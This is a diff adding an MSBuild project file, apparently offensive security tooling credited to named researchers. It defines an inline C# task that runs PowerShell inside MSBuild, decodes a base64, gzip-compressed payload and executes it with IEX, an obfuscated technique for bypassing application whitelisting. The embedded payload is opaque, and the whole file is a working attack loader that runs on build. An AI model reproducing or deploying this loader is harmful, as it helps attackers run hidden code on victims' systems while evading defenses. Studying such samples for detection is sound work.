@@ -1,0 +1,43 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+ <!-- Author: Pierre-Alexandre Braeken, Twitter: @pabraeken -->
+ <!-- Based on Casey Smith work (https://gist.github.com/subTee/ca477b4d19c885bec05ce238cbad6371), Twitter: @subTee  -->
+  <Target Name="34rfas">
+   <QWEridxnaPO/>
+  </Target>
+	<UsingTask
+    TaskName="QWEridxnaPO"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	<Task>
+	  <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[		
+			using System;
+			using System.IO;
+			using System.Diagnostics;
+			using System.Reflection;
+			using System.Runtime.InteropServices;
+			using System.Collections.ObjectModel;
+			using System.Management.Automation;
+			using System.Management.Automation.Runspaces;
+			using System.Text;
+			using Microsoft.Build.Framework;
+			using Microsoft.Build.Utilities;							
+			public class QWEridxnaPO :  Task, ITask {
+				public override bool Execute() {
+					string pok = "$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAAAAAAA/yVQbU/jMAz+K1GElFasKSscH+DT7sjQJDZ2rOPlTicl3cIWSNNd4zJG1f9O3EVybCf28zy2F3kyATElEWGP7JSpB0ZOCWGTEXpWWHE1/J8xgknz5zMEcSj9m7/sxL+IENoOu/aso8mYjdmA1aIviAm5JuFEeN3qPHlUtVE/rcYnOvydLWkApF/PFKtJ+L4LAacj6b0UZWEPlNNbkcv8Rc41jXqiy64975DuomszJG1/dJQkr2wJxgbuEVrpTXB8qpza6FI74CFtoCoVmMph4oMtDh50eZTK6UZqeJVG2Bsa9QIRO0OqHl4dMdfBJs7AWBmrsXXQq8p6PWe9sPO+gbAFKAjV2DWr3LwpLIYrtAF2Bk4vZC7D2EuBnCetk8s72w1OWpAPjehIfG30J4mimd4n98WbXgE5iuYzDfxJF7+sCdPF/KbaO1up9QJq4zYR2wLs/FWa1mrPNwa2TdF4Xa8qB7iMVVWmxVbVar1XbwflU+M+lA+bSUsV0Ot04j6qd51MTWneFXzxnR+yOP4GJJ+/KiUCAAA='));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();";
+					Runspace runspace = RunspaceFactory.CreateRunspace();
+					runspace.Open();
+					RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
+					Pipeline pipeline = runspace.CreatePipeline();
+					pipeline.Commands.AddScript(pok);
+					pipeline.Invoke();
+					runspace.Close();			
+					return true;
+				}								 
+			}			
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
